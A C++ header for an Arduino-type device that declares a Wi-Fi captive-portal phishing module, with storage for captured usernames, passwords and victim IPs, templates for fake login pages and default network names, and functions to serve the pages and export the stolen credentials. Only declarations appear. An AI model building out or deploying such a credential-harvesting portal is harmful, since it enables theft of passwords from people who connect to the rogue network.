#pragma once
#include <Arduino.h>

// ── Captive Portal Module ──

struct CapturedCred {
  char username[64];
  char password[64];
  char ip[16];
  unsigned long timestamp;
  int portalType;
};

struct PortalStyle {
  const char* id;
  const char* title;
  const char* subtitle;
  const char* icon;
  const char* primaryColor;
  const char* bgGradient;
  const char* userPlaceholder;
  const char* passPlaceholder;
  const char* defaultSSID;
};

extern CapturedCred capturedCreds[];
extern int capturedCount;
extern bool portalActive;
extern PortalStyle portalStyles[];
extern const int NUM_PORTAL_STYLES;

void initCaptivePortal();
void startCaptivePortal(int templateIdx, const char* customSSID);
void stopCaptivePortal();
void clearCreds();
String getPortalStatusJSON();
String getPortalCredsJSON();
String getPortalTemplatesJSON();
String generatePortalHTML(int templateIdx);
String generateSuccessHTML();